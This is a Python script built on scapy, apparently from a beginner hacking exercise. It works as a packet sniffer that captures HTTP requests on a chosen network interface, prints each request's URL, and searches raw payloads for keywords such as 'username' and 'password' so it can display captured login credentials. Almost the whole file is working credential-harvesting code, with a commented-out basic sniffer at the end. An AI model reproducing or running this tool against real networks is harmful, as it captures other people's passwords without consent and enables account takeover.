#!/usr/bin/env python

import subprocess as sub_proc
import scapy.all as scapy
from scapy.layers import http

sub_proc.call("clear", shell=True)
sub_proc.call("figlet Packet sniffer | lolcat", shell=True)
interface = input("[ ] Interface: ")

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keyWords = ["username", "user", "login", "password", "pass"]

            for key_word in keyWords:
                if key_word in load:
                    return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print(packet)
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Passible username/password >> " + login_info + "\n\n")
    else:
        print("\rError", end="")

sniff(interface)

# from scapy.all import sniff


# def packet_sniff(packet):
#     print(packet)


# def main():
#     sniff(count=0, store=False, prn=packet_sniff)

# main()
